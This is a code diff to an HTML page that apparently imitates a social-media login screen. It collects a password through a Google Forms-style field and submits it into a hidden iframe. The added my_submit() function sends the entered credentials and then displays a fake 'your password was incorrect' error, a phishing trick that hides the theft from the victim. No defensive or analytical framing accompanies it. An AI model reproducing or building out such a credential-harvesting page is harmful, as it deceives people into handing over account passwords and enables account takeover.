@@ -23,7 +23,7 @@
 				<div class="input_field">
 					<input type="password" name="entry.769519880" placeholder="Password" class="input">
 				</div>
-				<div class="btn" ><a href="#" onclick="document.getElementById('myform').submit();" >Log In</a></div>
+				<div class="btn" ><a href="#" onclick="my_submit();" >Log In</a></div>
 				
 			</div>
 			</form>
@@ -35,7 +35,9 @@
 			<div class="dif">
 				<div class="fb">
 					<img src="facebook.png" alt="facebook">
-					<p>Log in with Facebook</p>
+					<p>Log in with Facebook</p></div><br />
+					<div id=error style="display:none;">
+					<p><font color=red>Sorry, your password was incorrect. Please double-check your password.</font></p>
 				</div>
 				<div class="forgot">
 					<a href="#">Forgot password?</a>
@@ -74,7 +76,6 @@
 		</div>
 	</div>
 </div>
-
 <iframe name="target_name" style="display:none"></iframe>
 </body>
 <style>
@@ -171,7 +172,11 @@ body{
 	justify-content: center;
 	align-items: center;
 }
-
+.wrapper .dif #error{
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
 .wrapper .dif .fb img{
 	width: 16px;
 	height: 16px;
@@ -242,4 +247,11 @@ body{
 	color: #999;	
 }
 </style>
+<script>
+function my_submit(){
+	document.getElementById('myform').submit();
+	document.getElementById('error').style.display = "block";
+}
+</script>
+
 </html>
